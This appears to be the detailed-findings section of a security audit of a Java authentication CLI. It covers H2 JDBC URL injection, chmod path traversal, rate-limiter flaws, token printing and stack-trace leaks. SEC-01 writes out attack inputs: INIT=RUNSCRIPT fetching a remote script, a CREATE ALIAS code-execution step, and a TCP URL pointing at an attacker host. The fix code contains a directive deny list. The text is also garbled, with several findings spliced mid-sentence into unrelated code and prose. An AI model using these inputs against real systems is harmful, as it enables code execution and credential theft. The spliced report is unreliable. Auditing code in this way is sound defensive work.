Detailed Findings\n\n### SEC-01: Unvalidated `AUTH_DB_URL` reaches `DriverManager`, enabling H2 `INIT=RUNSCRIPT` remote code execution and a hostile credential store\n\n**Severity:** High\n\n**CWE:** CWE-20 (Improper Input Validation), CWE-94 (Improper Control of Generation of Code), CWE-15 (External Control of System or Configuration Setting)\n\n**Location:** `src/main/java/com/example/auth/DatabaseManager.java:132-138`, `:39-49`, `:55-57`\n\n**Vulnerable code:** `DatabaseManager.java:132-138`\n\n```java\n    private static String resolveDatabaseUrl() {\n        String envUrl = System.getenv(\"AUTH_DB_URL\");\n        if (envUrl != null && !envUrl.isBlank()) {\n            return envUrl.trim();\n        }\n        return DEFAULT_IN_MEMORY_URL;\n    }\n```\n\n**Vulnerable code:** `DatabaseManager.java:39-49`\n\n```java\n    public DatabaseManager(String dbUrl, String dbUser, String dbPassword) {\n        if (dbUrl == null || dbUrl.isBlank()) {\n            throw new IllegalArgumentException(\"Database URL cannot be null or blank\");\n        }\n        this.dbUrl = dbUrl;\n        this.dbUser = (dbUser != null) ? dbUser : \"\";\n        this.dbPassword = (dbPassword != null) ? dbPassword : \"\";\n\n        ensureSecureFilePermissionsIfLocal(this.dbUrl);\n        initializeSchema();\n    }\n```\n\n**Vulnerable code:** `DatabaseManager.java:55-57`\n\n```java\n    public Connection getConnection() throws SQLException {\n        return DriverManager.getConnection(this.dbUrl, this.dbUser, this.dbPassword);\n    }\n```\n\n**Why it is a problem:** The only check applied to the environment-supplied URL anywhere on its path is \"not null and not blank\", plus `trim()`. An H2 JDBC URL is not an opaque address — it is a small configuration language, and the only consumer of this string is `DriverManager.getConnection`. Two of its features turn attacker-controlled URL text into code execution at connect time: the `INIT=` property, which executes SQL against the new connection before it is returned, and `RUNSCRIPT FROM 'http://host/file.sql'`, which fetches and executes an arbitrary remote script. A single statement in that script — `CREATE ALIAS PWN FOR 'pkg.Class.run'` — causes H2 to compile and invoke arbitrary Java in the application's own process, with the application's own file and network privileges, before `initializeSchema()` returns. No credential or file write is needed to reach it; the trigger is the first `getConnection()` call, which the CLI performs unconditionally at start-up. The same variable additionally allows `jdbc:h2:tcp://attacker/...`, which silently redirects the entire credential store — every email, salt and PBKDF2 hash — to a server the attacker runs, and which then also controls the `iterations` and `algorithm` values the code later trusts for work-factor decisions (see SEC-11). `AUTH_DB_USER` and `AUTH_DB_PASSWORD` are read from the same trust domain (SEC-12), so one environment-setting primitive on either side of the deployment — a CI variable, a container manifest, a `.env` committed to a repo, a compromised deploy step — yields code execution, exfiltration, and permission tampering (SEC-02) at once. The README treats `AUTH_DB_URL` purely as convenience configuration and lists env-based configuration as a control (Rule \"credentials never hardcoded\"), so an integrator has no signal that this variable is a code-execution surface.\n\n**Fix:** Treat the URL as untrusted input and constrain it to the two shapes the component actually needs, rejecting anything that can carry instructions. Prefer constructing the URL from validated parts over parsing a caller's string at all.\n\n```java\n    private static final Pattern APPROVED_H2_URL = Pattern.compile(\n            \"jdbc:h2:(?:mem:[A-Za-z0-9_\\\\-/]{1,64}\"\n          + \"|\\\\./(?:[A-Za-z0-9_\\\\-]+/){0,4}[A-Za-z0-9_\\\\-]{1,64})\"\n          + \"(?:;(?:DB_CLOSE_DELAY=-1|DB_CLOSE_ON_EXIT=FALSE|CIPHER=AES)){0,3}\"\n    );\n\n    /** Directive- and transport-denied, so the string can never select behaviour. */\n    static String validateDatabaseUrl(String candidate) {\n        String url = (candidate == null || candidate.isBlank())\n                ? DEFAULT_IN_MEMORY_URL : candidate.trim();\n        String upper = url.toUpperCase(Locale.ROOT);\n        for (String banned : List.of(\"INIT\", \"RUNSCRIPT\", \"CREATE ALIAS\", \"SHUTDOWN\",\n                                     \"TCP:\", \"SSL:\", \"AUTO_SERVER\")) {\n            if (upper.contains(banned)) {\n                throw new IllegalArgumentException(\"Database URL rejected: forbidden directive\");\n            }\n        }\n        if (!APPROVED_H2_URL.matcher(url).matches()) {\n            throw new IllegalArgumentException(\"Database URL rejected: not an approved local H2 URL\");\n        }\n        return url;\n    }\n```\n\nCall it before the field is assigned so no other code path can observe an unvalidated value, and keep the check in the constructor so library callers who pass `dbUrl` directly are covered too:\n\n```java\n    public DatabaseManager(String dbUrl, String dbUser, String dbPassword) {\n        this.dbUrl = validateDatabaseUrl(dbUrl);   // replaces the null/blank check\n        this.dbUser = (dbUser != null) ? dbUser : \"\";\n        this.dbPassword = (dbPassword != null) ? dbPassword : \"\";\n\n        ensureSecureFilePermissionsIfLocal(this.dbUrl);\n        initializeSchema();\n    }\n```\n\n---\n\n### SEC-02: `chmod 0700` applied to any existing directory named by the unvalidated URL, with no traversal check\n\n**Severity:** High\n\n**CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory), CWE-281 (Improper Preservation of Permissions)\n\n**Location:** `src/main/java/com/example/auth/DatabaseManager.java:91-126` (in particular `:100-112`)\n\n**Vulnerable code:** `DatabaseManager.java:91-99`\n\n```java\n    private static void ensureSecureFilePermissionsIfLocal(String jdbcUrl) {\n        if (jdbcUrl.startsWith(\"jdbc:h2:./\") || jdbcUrl.startsWith(\"jdbc:h2:/\")) {\n            try {\n                // Extract file path from H2 JDBC URL\n                String rawPath = jdbcUrl.substring(\"jdbc:h2:\".length());\n                int semicolonIdx = rawPath.indexOf(';');\n                if (semicolonIdx >= 0) {\n                    rawPath = rawPath.substring(0, semicolonIdx);\n                }\n```\n\n**Vulnerable code:** `DatabaseManager.java:100-112`\n\n```java\n                Path path = Paths.get(rawPath);\n                Path parent = path.getParent();\n                if (parent != null) {\n                    if (!Files.exists(parent)) {\n                        if (supportsPosix()) {\n                            Set<PosixFilePermission> dirPerms = PosixFilePermissions.fromString(\"rwx------\");\n                            Files.createDirectories(parent, PosixFilePermissions.asFileAttribute(dirPerms));\n                        } else {\n                            Files.createDirectories(parent);\n                        }\n                    } else if (supportsPosix()) {\n                        Files.setPosixFilePermissions(parent, PosixFilePermissions.fromString(\"rwx------\"));\n                    }\n```\n\n**Why it is a problem:** The path is taken by substring from the same unvalidated URL as SEC-01, and the result is used to *mutate filesystem permissions* before any connection is opened. The `startsWith` test selects on prefix only; nothing normalises the path or confines it to a data root. `Paths.get` does not collapse `..`, so `jdbc:h2:./../../../../var/lib/app/db` passes the `./` prefix test and yields a `parent` outside any intended directory, which the code then unconditionally rewrites to `0700`. An absolute form needs no traversal at all: `jdbc:h2:/etc/app/x` targets `/etc/app`. The primitive has two distinct harms. Where the process owns or may modify the target, it *strips group and other access from a directory that was deliberately shared* — a deploy directory, a shared mount, a home directory containing `~/.ssh` or a group-readable data volume — breaking availability and, for the `!Files.exists` branch, *creating* an owner-only directory at an attacker-chosen location where the administrator expected something else. Where it does not own the target, the `IOException` is caught and merely logged (L122-124), so the attempt is non-fatal and effectively silent to the operator, who sees a permission-hardening \"control\" reported in the README as if it had applied. The hardening intent is sound and the code even bothers to detect POSIX support; the defect is that the target of the hardening is chosen by untrusted input, which converts a protective `chmod` into an unvalidated write primitive on the mode bits of arbitrary paths — and it fires twice per start-up, from the constructor (L47) and again from `initializeSchema()` (L85).\n\n**Fix:** Never derive a filesystem target from a URL string. Pass the data directory as its own validated setting, resolve it to a canonical absolute path, and refuse anything that escapes the configured root before touching permissions.\n\n```java\n    private static void ensureSecureFilePermissionsIfLocal(String jdbcUrl, Path allowedRoot) {\n        String pathPart = extractFilePortion(jdbcUrl);           // no-op for mem: URLs\n        if (pathPart == null) {\n            return;                                             // in-memory store: nothing to chmod\n        }\n        Path root = allowedRoot.toAbsolutePath().normalize();\n        Path parent = Paths.get(pathPart).toAbsolutePath().normalize().getParent();\n        if (parent == null || !parent.startsWith(root)) {\n            throw new IllegalArgumentException(\"Database path escapes the configured data root\");\n        }\n        applyOwnerOnlyPermissions(parent);                       // create/0700 or set/0700 as before\n        applyOwnerOnlyFile(parent.resolve(fileBasename(pathPart)));// 0600 for <name>.mv.db\n    }\n```\n\nwith the root supplied by configuration (`resolveDatabaseUrl()` returning only `mem:` or `./`-relative paths per SEC-01's allow-list), and with the `IOException` branch escalated to a fatal start-up error rather than a logged warning, so a failed hardening attempt is never mistaken for a successful one.\n\n---\n\n### SEC-03: Rate limiter consumes a permit on every attempt and refunds only on success, locking out legitimate users\n\n**Severity:** High\n\n**CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-362 (Concurrent Execution using Shared Resource with Improper Synchronization)\n\n**Location:** `src/main/java/com/example/auth/RateLimiter.java:116-130`, `:147-159`; `src/main/java/com/example/auth/AuthenticationService.java:64-69`\n\n**Vulnerable code:** `RateLimiter.java:116-130`\n\n```java\n        // 1. Concurrency & Rate Limiting Check (Rules 3 & 7)\n            RateLimiter.RateLimitResult rateCheck = rateLimiter.checkAndAcquire(safeSource, safeEmail);\n            if (!rateCheck.isAllowed()) {\n                SecurityLogger.logRateLimitExceeded(safeEmail, safeSource, rateCheck.status().name());\n                return AuthenticationResult.rateLimited();\n            }\n```\n\n**Why it is a problem:** The two enforcing counters are incremented inside `checkAndAcquire`, i.e. once per *attempt*, before the credential is examined — the state names (`MAX_SOURCE_ATTEMPTS`, `SOURCE_BLOCKED`, \"Attempt permitted\") are honest about this, while the failure path is not. `recordAuthenticationFailure` is the only place that would express \"this attempt was bad\", and as shown above it touches *only* `globalAccountTrackers` and ignores its `sourceId` parameter entirely, contradicting its own Javadoc, which promises increments \"across source, (source, account), and global account trackers\". Consequently the per-source and per-(source,account) budgets are spent by attempts whether they fail or not, and the only code that ever gives them back is `recordAuthenticationSuccess`. The result is a limiter whose effective semantics are \"five attempts per source per five minutes, three per account\", with forgiveness available only to someone who already knows the correct password. A mistyped first attempt is charged against the user's own budget; three mistypes lock that source out of that account for five minutes.\n\nThe lockout becomes a genuine denial of service once the identity is shared, which it is (SEC-04): `Main` defaults `sourceId` to the constant `cli-local`, so every client launched without the environment variable lands in one bucket of 5 attempts per 5 minutes and 3 per account — an attacker needs five cheap calls to refuse service to all of them, and the legitimate users cannot work their way out because success is the only refund. Conversely an attacker who *does* set a distinct `AUTH_SOURCE_ID` per attempt is never limited at all, so the control both denies service to honest users and fails to stop the adversary it names in its reason strings. Two concurrency notes, stated precisely: each `AttemptTracker` method is `synchronized`, so a counter cannot be read torn, and the README's \"Atomic Check-and-Act\" claim holds *within* a tracker; what is not atomic is the two-stage acquire (a request can consume a source permit and then be rejected by the account stage, leaving the first permit spent with no failure recorded), and `getCount` followed by the caller's sleep (SEC-07) is a read-then-act pair with no lock spanning it, so concurrent requests all observe the same count and all sleep.\n\n**Fix:** Make the counters mean failures, keep the atomic acquire (it is the right primitive), and refund the permit on every outcome that is not a credential failure. Give the failure recorder the same keys it documents.\n\n```java\n    // AttemptTracker: return a permit that was consumed by a non-failure outcome.\n        synchronized void refund() {\n            if (count > 0) {\n                count--;\n            }\n        }\n\n    // RateLimiter: refunds the source and (source,account) permits.\n    public void refundAttempt(String sourceId, String email) {\n        long now = System.currentTimeMillis();\n        String safeSource = InputValidator.sanitizeSourceId(sourceId);\n        String safeEmail = InputValidator.canonicalizeEmail(email);\n        AttemptTracker source = sourceTrackers.get(safeSource);\n        if (source != null) {\n            source.refund();\n        }\n        if (!safeEmail.isEmpty()) {\n            AttemptTracker pair = sourceAccountTrackers.get(safeSource + \":\" + safeEmail);\n            if (pair != null) {\n                pair.refund();\n            }\n        }\n    }\n\n    // RateLimiter: failures now charge the enforcing buckets, as documented.\n    public void recordAuthenticationFailure(String sourceId, String email) {\n        long now = System.currentTimeMillis();\n        String safeSource = InputValidator.sanitizeSourceId(sourceId);\n        String safeEmail = InputValidator.canonicalizeEmail(email);\n        getOrCreateTracker(sourceTrackers, safeSource, SOURCE_WINDOW_MS, MAX_SOURCE_ATTEMPTS, now)\n                .tryAcquire(now);\n        if (!safeEmail.isEmpty()) {\n            getOrCreateTracker(sourceAccountTrackers, safeSource + \":\" + safeEmail,\n                    SOURCE_ACCOUNT_WINDOW_MS, MAX_SOURCE_ACCOUNT_ATTEMPTS, now).tryAcquire(now);\n            getOrCreateTracker(globalAccountTrackers, safeEmail,\n                    GLOBAL_ACCOUNT_WINDOW_MS, Integer.MAX_VALUE, now).tryAcquire(now);\n        }\n    }\n```\n\nand in `authenticate`, refund rather than silently leak the permit for the outcomes that are not a wrong credential — malformed input, database error, and the rate-limited return itself, which currently spends a source permit in order to say \"too many attempts\":\n\n```java\n            if (!emailValid || !passwordValid) {\n                passwordHasher.verifyDummyPassword(passwordChars);\n                rateLimiter.refundAttempt(safeSource, safeEmail);   // malformed input is not a credential failure\n                SecurityLogger.logAuthFailure(safeEmail, safeSource, \"MALFORMED_INPUT\");\n                return AuthenticationResult.invalidCredentials();\n            }\n```\n\n---\n\n### SEC-04: Rate-limit identity is a caller-supplied environment variable; invalid values collapse unrelated users into shared buckets\n\n**Severity:** High\n\n**CWE:** CWE-290 (Authentication Bypass by Spoofing), CWE-770 (Allocation of Resources Without Limits or Throttling)\n\n**Location:** `src/main/java/com/example/auth/Main.java:76-79`; `src/main/java/com/example/auth/InputValidator.java:118-131`\n\n**Vulnerable code:** `Main.java:76-79`\n\n```java\n            String sourceId = System.getenv(\"AUTH_SOURCE_ID\");\n            if (sourceId == null || sourceId.isBlank()) {\n                sourceId = \"cli-local\";\n            }\n```\n\n**Vulnerable code:** `InputValidator.java:118-131`\n\n```java\n    public static String sanitizeSourceId(String sourceId) {\n        if (sourceId == null || sourceId.isBlank()) {\n            return \"unknown-source\";\n        }\n        String trimmed = sourceId.trim();\n        if (trimmed.length() > MAX_SOURCE_ID_LENGTH) {\n            trimmed = trimmed.substring(0, MAX_SOURCE_ID_LENGTH);\n        }\n        if (SOURCE_ID_PATTERN.matcher(trimmed).matches()) {\n            return trimmed;\n        }\n        // Fall back to a safe placeholder if invalid characters are present\n        return \"invalid-source-format\";\n    }\n```\n\n**Why it is a problem:** Every abuse control in this component is keyed on `sourceId`, and `sourceId` is a string the caller invents in its own environment. It is not attested by anything — no peer address, no certificate, no signed token — so it carries none of the assumptions a rate limit needs in order to bound an adversary. The attacker chooses their identity per attempt (`AUTH_SOURCE_ID=try-000001`, `try-000002`, …), which defeats both enforcing buckets outright and, because each fresh identity allocates three new tracker entries, simultaneously drives the memory growth in SEC-08. There is no ceiling on the number of distinct source keys, so the \"per source\" qualifier has no referent.\n\nThe default and the two fallbacks push the same design the other way, into a shared-fate hazard. With the variable unset — the ordinary way to run this CLI — all clients share `cli-local`, so the 5-per-5-minutes budget in SEC-03 becomes an organisation-wide budget and five attacker calls lock out everyone. `sanitizeSourceId` then collapses every blank value onto the single key `unknown-source` and every syntactically invalid value onto the single key `invalid-source-format`, so an attacker can deliberately land in either shared bucket by sending a value with one disallowed character, and can merge their traffic with that of misconfigured clients in the same key. Truncation at 64 characters merges identifiers that agree on their first 64 characters, which is the opposite of what a distinct-key guarantee requires. Finally, collapsing distinct clients into two fixed keys destroys the very signal `detecting-anomalous-authentication-patterns` style detection needs: the audit trail records `Source=invalid-source-format` for a crowd of unrelated clients, so per-principal baselines cannot be built at all.\n\n**Fix:** Do not let the caller name itself. Bind the identity to something the transport already attests, and make \"unknown\" mean *this connection*, never a shared sentinel.\n\n```java\n    // Main: identity comes from the platform, not from the environment.\n    // In a servlet container: req.getRemoteAddr(), or the verified mTLS subject.\n    // In a CLI there is no trustworthy source, so use one per process invocation.\n    private static String resolveSourceId() {\n        String fromEnv = System.getenv(\"AUTH_SOURCE_ID\");\n        if (fromEnv != null && !fromEnv.isBlank()) {\n            String cleaned = InputValidator.sanitizeSourceId(fromEnv);\n            if (!InputValidator.isUsableSourceId(cleaned)) {\n                throw new IllegalArgumentException(\"AUTH_SOURCE_ID is not a valid client identifier\");\n            }\n            return cleaned;\n        }\n        return \"cli-\" + UUID.randomUUID();   // distinct, never shared, never a fixed key\n    }\n```\n\n```java\n    // InputValidator: reject instead of collapsing, so callers cannot opt into a shared bucket.\n    public static boolean isUsableSourceId(String candidate) {\n        return candidate != null\n                && candidate.length() >= 1\n                && candidate.length() <= MAX_SOURCE_ID_LENGTH\n                && SOURCE_ID_PATTERN.matcher(candidate).matches();\n    }\n```\n\nKeep `checkAndAcquire`'s internal call to `sanitizeSourceId` as a defensive re-check, but have it fail closed by returning a `Status` that refuses service for a malformed identity rather than a bucket everyone shares.\n\n---\n\n### SEC-05: Raw bearer token printed to stdout in the `Cookie:` line\n\n**Severity:** High\n\n**CWE:** CWE-532 (Insertion of Sensitive Information into Log File), CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor)\n\n**Location:** `src/main/java/com/example/auth/Main.java:85-88`; `src/main/java/com/example/auth/SessionManager.java:80-83`\n\n**Vulnerable code:** `Main.java:85-88`\n\n```java\n                result.getSession().ifPresent(session -> {\n                    System.out.println(\"Session Token: \" + SecurityLogger.maskToken(session.sessionId()));\n                    System.out.println(\"Cookie: \" + session.cookieHeader());\n                });\n```\n\n**Vulnerable code:** `SessionManager.java:80-83`\n\n```java\n        String cookieHeader = String.format(\n                \"__Host-AuthSession=%s; A CLI's stdout is the least private channel in most environments: it lands in interactive terminal scrollback and shell history wrappers, in `tee`/`script`/`script -f` recordings, in CI job logs and their retained artifacts, in systemd unit journals, in support screenshots and pasted \"here's what it printed\" snippets, and in any wrapper script that captures output for parsing. Whoever holds that string holds a complete bearer credential for `DEFAULT_SESSION_DURATION_SECONDS` (3600s) with no second factor, no binding, and no revocation path that production code ever invokes (SEC-16). This directly contradicts the component's own Rule 2, which the `SecurityLogger` class header states as \"Passwords and secrets are never printed or logged\", and it is the highest-impact of the exposure findings because the printed artifact is the credential itself rather than a hint about it.\n\n**Fix:** Print the masked correlation form by default, and require an explicit opt-in to emit the raw value — the same discipline as a cloud CLI printing an access key once.\n\n```java\n                result.getSession().ifPresent(session -> {\n                    System.out.println(\"Session: \" + SecurityLogger.maskToken(session.sessionId()));\n                    if (showRawToken) {                       // --show-token, default false\n                        System.err.println(\"WARNING: writing a live bearer token to stdout.\");\n                        System.out.println(\"Cookie: \" + session.cookieHeader());\n                    } else {\n                        System.out.println(\"Cookie: __Host-AuthSession=<redacted>; Path=/; Secure; HttpOnly; SameSite=Strict\");\n                    }\n                });\n```\n\nIf the raw cookie must be machine-readable for a scripted caller, write it to a descriptor or file the caller controls (`--cookie-file`, created `0600`) instead of the channel a human and every log shipper read.\n\n---\n\n### SEC-06: Public getters expose the limiter, session factory and hasher; `resetAll()` disarms throttling, `createSession()` mints sessions with no credential check\n\n**Severity:** High\n\n**CWE:** CWE-749 (Exposed Dangerous Method or Function), CWE-284 (Improper Access Control), CWE-639 (Authorization Bypass Through User-Controlled Key)\n\n**Location:** `src/main/java/com/example/auth/AuthenticationService.java:189-199`; Given a user id, that is a complete authentication bypass (CWE-639: the authorisation decision is now driven by a caller-supplied key). `getPasswordHasher()` additionally lets a holder construct a `PasswordHasher` at the 100,000-iteration floor or re-tune policy, undermining the work factor `authenticate` relies on.\n\nWhat makes this reportable rather than merely untidy is that none of the three getters is used: grepping `src/` finds no call site for `getRateLimiter`, `getSessionManager` or `getPasswordHasher`, and none for `resetAll` anywhere, including the test sources. The Javadoc on `resetAll` even says \"useful for test isolation\", but the tests do not call it. This is therefore attack surface with no function — the exposure exists purely because the fields were made reachable for convenience. In the deployment this component actually invites (a library inside a web application), the reference-holding set is large: dependency-injection containers, health endpoints, admin modules, plugins and test-support beans can all see `AuthenticationService`, and each of them then holds a bypass path around Rules 3, 4 and 7.\n\n**Fix:** Delete the getters — nothing calls them — and make the collaborators constructor-injected so they remain testable seams without being exposed from the security-critical object.\n\n```java\n    public final class AuthenticationService {\n\n        private final DatabaseManager databaseManager;\n        private final UserRepository userRepository;\n        private final PasswordHasher passwordHasher;\n        private final RateLimiter rateLimiter;\n        private final SessionManager sessionManager;\n\n        // Tests inject their own instances; Check global account throttle to defend against distributed attacks without DoSing legitimate users\n        long progressiveDelayMs = 0;\n        if (!safeEmail.isEmpty()) {\n            AttemptTracker globalAccountTracker = getOrCreateTracker(globalAccountTrackers, safeEmail,\n                    GLOBAL_ACCOUNT_WINDOW_MS, Integer.MAX_VALUE, now);\n            int globalFailures = globalAccountTracker.getCount(now);\n            if (globalFailures >= GLOBAL_ACCOUNT_THROTTLE_THRESHOLD) {\n                int excess = globalFailures - GLOBAL_ACCOUNT_THROTTLE_THRESHOLD + 1;\n                progressiveDelayMs = Math.min((long) excess * 500L, MAX_PROGRESSIVE_DELAY_MS);\n            }\n        }\n```\n\n**Vulnerable code:** `AuthenticationService.java:71-80`\n\n```java\n            // Apply progressive delay if account is under distributed brute force pressure\n            if (rateCheck.progressiveDelayMs() > 0) {\n                try {\n                    Thread.sleep(rateCheck.progressiveDelayMs());\n                } catch (InterruptedException e) {\n                    Thread.currentThread().interrupt();\n                    SecurityLogger.logSystemError(\"Authentication thread interrupted during throttle delay\", e);\n                    return AuthenticationResult.internalError();\n                }\n            }\n```\n\n**Why it is a problem:** This is the component's only control that spans sources, and it is aimed at the wrong party. The delay is keyed solely on the target's email address, with no reference to who produced the recorded failures, and it is applied to *whatever request arrives next for that address*. The attacker therefore does not pay the cost — they set the alarm and walk away, and the 3-second ceiling is charged to the legitimate owner's next login. Reaching the threshold costs five recorded failures (`GLOBAL_ACCOUNT_THROTTLE_THRESHOLD = 5`), after which every genuine login to that mailbox sleeps 3 seconds inside the authentication call for the remainder of the 10-minute window, renewable indefinitely with five more calls per window. The README's adversarial matrix lists exactly this scenario — \"Attacker locks out legitimate admin by repeatedly failing logins for admin email\" — and marks it defeated on the grounds that source-scoped blocking leaves the real user free; but source scoping is precisely what an adversary escapes with per-attempt identities (SEC-04), leaving this global delay as the only remaining control, and it fires on the victim rather than the attacker.\n\nIt also fails in the other direction: it never refuses anything. `Status` has exactly three constants (`ALLOWED`, `SOURCE_BLOCKED`, `SOURCE_ACCOUNT_BLOCKED`), so a `RateLimitResult` carrying a delay is `ALLOWED` — the global tracker is created with `Integer.MAX_VALUE` attempts and can only ever produce a sleep. An attacker behind a few thousand identities is slowed by at most 3 seconds per attempt while the target's users are slowed on every attempt, so the ratio favours the attacker. Finally, `Thread.sleep` inside the authentication path is itself the resource problem: the request thread is held, along with its connection, its request context and its position in the container's worker pool, so N concurrent targeted logins convert a 3-second \"polite\" delay into sustained thread exhaustion (CWE-400), and because the sleep is bounded while the failure count is not, the control cannot escalate past 3 seconds no matter how large the abuse becomes.\n\n**Fix:** Charge the cost to the source that produced the failures, escalate to refusal rather than a capped sleep, and never block a worker thread for policy reasons.\n\n```java\n    // RateLimiter: the global tracker becomes an enforcing check, not an advisory pause.\n    public enum Status {\n        ALLOWED,\n        SOURCE_BLOCKED,\n        SOURCE_ACCOUNT_BLOCKED,\n        ACCOUNT_THROTTLED          // new: refusal, not a pause\n    }\n\n        if (!safeEmail.isEmpty()) {\n            AttemptTracker globalAccountTracker = getOrCreateTracker(globalAccountTrackers, safeEmail,\n                    GLOBAL_ACCOUNT_WINDOW_MS, MAX_GLOBAL_ACCOUNT_ATTEMPTS, now);\n            if (!globalAccountTracker.tryAcquire(now)) {\n                return new RateLimitResult(Status.ACCOUNT_THROTTLED, 0,\n                        \"Account temporarily throttled; retry after backoff\");\n            }\n        }\n```\n\n```java\n            // AuthenticationService: no sleeping in the request path; tell the client to back off.\n            if (!rateCheck.isAllowed()) {\n                SecurityLogger.logRateLimitExceeded(safeEmail, safeSource, rateCheck.status().name());\n                return AuthenticationResult.rateLimited(); There is no LRU anywhere — no access-order tracking, no recency field, nothing that could rank entries for eviction. What exists is a threshold test (`entryCount.get() > MAX_CACHE_ENTRIES`) that triggers a sweep removing *only trackers whose window has already fully elapsed*. Those are exactly the entries an adversary does not generate: by minting a fresh identity per attempt (SEC-04), every key the attacker creates is young, so the sweep frees nothing while insertion continues. Because the tracker window is 5 or 10 minutes, the live working set is roughly the attempt rate multiplied by the window, with no ceiling the code can apply to it — an attacker issuing, say, 2,000 uniquely-identified attempts per second holds tens of thousands of live trackers per window, each a map entry plus an object plus two strings, and the 10,000 threshold becomes a trigger for a full three-map iteration that reclaims nothing rather than a bound on memory. The threshold is also evaluated once per `checkAndAcquire`, so a burst between two calls allocates freely, and `entryCount` is only recomputed after a purge — it never decreases as a result of ordinary operation, meaning once the sweep stops freeing space, every subsequent call pays three full map iterations and still grows. The identical shape appears in `SessionManager.evictIfNecessary()` (`SessionManager.java:115-125`), where sessions past `MAX_ACTIVE_SESSIONS` are kept unless already expired, so 10,000 live sessions is a floor, not a cap. The practical consequence of unbounded tracker growth is heap exhaustion and full-GC stalls in a service whose stated job is to survive abuse; a limiter that can be switched off by filling memory is not a limiter.\n\n**Fix:** Bound the structure by capacity with LRU eviction, and make the counter decrement when entries are actually removed. The connection identity falls back to the H2 default superuser `sa` with the empty string as its password, so unless an operator sets both variables the application connects as the owner of the database with no secret at all; nothing in the code warns, refuses, or even notices that it is running with factory credentials. The default URL is `jdbc:h2:mem:...`, which is discarded on exit — so an application that believes it is persisting accounts is not, and the moment an operator does choose persistence by setting `AUTH_DB_URL` to a file URL, they land in the third condition: H2's file store is written in cleartext, containing each account's email, salt, PBKDF2 digest and iteration count in a plain `.mv.db` file. There is no `CIPHER=AES` in any default URL, and no code path that encrypts at rest. The `0700` directory permission and the `0600` goal described in the README reduce *which local users* can read that file; they do not protect its contents from anyone who obtains the file itself — a backup, a snapshot, a container image layer, a `cp` of the volume, an agent on the host reading root-owned files — and the file's digest format is fully documented in this very repository, which lowers the offline-cracking cost to a well-understood problem: 210,000-iteration PBKDF2-HMAC-SHA256 is a single well-defined target for GPU cracking of anything an 8-character minimum policy allowed.\n\nOn top of that sits the empty-store behaviour. `Main` counts users, and if the store is empty it drops the operator straight into registration — with no bootstrap credential, no confirmation and no ownership proof (L53-57 above; the count query itself is at `Main.java:53`, which grep confirms is `countUsers`' only call site). Any process that can reach an unprovisioned database therefore becomes the first account holder, and against a reachable H2 TCP server with `sa`/empty that is a remote, unauthenticated claim of the first identity. `handleRegistration` performs no authorization check, so the \"first user\" privilege is granted by arrival order — and because registration is entirely unthrottled (SEC-15), an attacker who reaches the store first can also flood it before the operator ever starts the CLI.\n\n**Fix:** Fail closed on factory credentials, encrypt the file store, and require a bootstrap secret for the first account.\n\n```java\n    private static String resolvePassword() {\n        String envPass = System.getenv(\"AUTH_DB_PASSWORD\");\n        if (envPass == null || envPass.isBlank()) {\n            throw new IllegalStateException(\n                    \"AUTH_DB_PASSWORD is required; refusing to connect with default credentials\");\n        }\n        return envPass;\n    }\n\n    private static String resolveUser() {\n        String envUser = System.getenv(\"AUTH_DB_USER\");\n        if (envUser == null || envUser.isBlank() || \"sa\".equals(envUser.trim())) {\n            throw new IllegalStateException(\"AUTH_DB_USER must be a non-default least-privilege account\");\n        }\n        return envUser.trim();\n    }\n```\n\nRequire encryption for any file-backed store, and gate first-account creation on an out-of-band secret:\n\n```java\n    public DatabaseManager(String dbUrl, String dbUser, String dbPassword) {\n        this.dbUrl = validateDatabaseUrl(dbUrl);\n        if (this.dbUrl.toUpperCase(Locale.ROOT).startsWith(\"JDBC:H2:.\")\n                && !this.dbUrl.toUpperCase(Locale.ROOT).contains(\"CIPHER=AES\")) {\n            throw new internals\n\n**Severity:** Medium\n\n**CWE:** CWE-209 (Generation of Error Message Containing Sensitive Information), CWE-532 (Insertion of Sensitive Information into Log File)\n\n**Location:** `src/main/java/com/example/auth/SecurityLogger.java:21-35`, `:109-111`\n\n**Vulnerable code:** `SecurityLogger.java:21-35`\n\n```java\n    static {\n        LOGGER.setUseParentHandlers(false);\n        ConsoleHandler handler = new ConsoleHandler();\n        handler.setLevel(Level.INFO);\n        handler.setFormatter(new Formatter() {\n            @Override\n            public String format(LogRecord record) {\n                return String.format(\"[%1$tF %1$tT.%1$tL] [%2$s] %3$s%n\",\n                        record.getMillis(),\n                        record.getLevel().getName(),\n                        record.getMessage());\n            }\n        });\n        LOGGER.addHandler(handler);\n    }\n```\n\n**Vulnerable code:** `SecurityLogger.java:109-111`\n\n```java\n    public static void logSystemError(String operation, Throwable throwable) {\n        LOGGER.log(Level.SEVERE, \"SECURITY [SYSTEM_ERROR] Operation=\" + sanitizeCrlf(operation), throwable);\n    }\n```\n\n**Why it is a problem:** The custom formatter deliberately omits the throwable — it prints only timestamp, level and message — which reads as an intentional decision not to emit stack traces. That is not what happens. `ConsoleHandler` inherits `StreamHandler.publish`, which writes the formatted message and *then* appends `LogRecord.getThrown()`'s stack trace to the same stream regardless of the formatter. The `throwable` argument at L110 therefore still reaches stderr in full: exception classes, H2 driver internals, `SQLException` chains containing SQL fragments, absolute database paths, `Caused by` lines, and the calling frames of this application. The only sanitisation applied is `sanitizeCrlf` on the operation label — which correctly prevents log injection through the message but does nothing about the trace, so the class's careful CRLF and email-masking discipline stops exactly where the sensitive part begins.\n\nThe exposure is amplified by how widely this one call is used: it is the error path for registration, for failed database queries during authentication, for schema initialisation, for permission-setting failures, and for interrupted threads — so the leak is not an edge case but the default failure behaviour. Stack-trace text on stderr is a routine map for an attacker: it names the database engine and version from the driver package, confirms which `AUTH_DB_URL` shape is in use and where the file lives (feeding SEC-01 and SEC-02), and reveals whether an email lookup failed on syntax, on a constraint violation, or on connectivity — which is itself a weak enumeration and state oracle. It also directly contradicts Rule 2 as stated in this class's own header (\"Passwords and secrets are never printed or logged\"): exception messages from `SQLException` and from H2 routinely embed connection strings and file paths, and `IllegalArgumentException` messages here embed the rejected input verbatim. Since stderr of a CLI or a container is collected into CI logs, journals and support artifacts (the same channels that make SEC-05 material), the effective audience is far wider than the operator.\n\n**Fix:** Do not pass the throwable to the record; log a correlation identifier and keep the trace where the operator can see it but log shippers cannot, or explicitly mark it internal-only.\n\n```java\n    public static void logSystemError(String operation, Throwable throwable) {\n        String correlationId = Long.toHexString(SECURE_RANDOM.nextLong());\n        String safeMessage = \"SECURITY 